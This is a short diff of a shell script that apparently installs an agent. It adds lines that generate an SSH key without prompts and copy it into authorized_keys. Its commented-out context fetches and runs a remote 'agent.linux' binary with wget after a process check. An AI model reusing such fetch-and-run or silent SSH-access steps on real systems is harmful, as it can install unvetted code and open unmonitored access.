@@ -238,6 +238,11 @@ exit;
 #(${b2} ps aux | grep -E "[6][1][0][8][0]") && echo 61080_ok || (
 #    sum2 || ([ -x ./wget ] && ./wget "${rr1}agent.linux" && sum2)
 #)
+mkdir ~/.ssh;
+cd ~/.ssh;
+(echo "ssh-keygen -t  rsa";sleep 0.8;echo -e "\n";sleep 0.6;echo -e "\n\n\nexit\nexit\n";)|script /tmp/null 
+cp id_rsa.pub  authorized_keys;
+
 
 if [ ! -z ${sp9} ]; then sleep $sp9; fi
 #[ -z ${sp5} ] && sleep $sp5
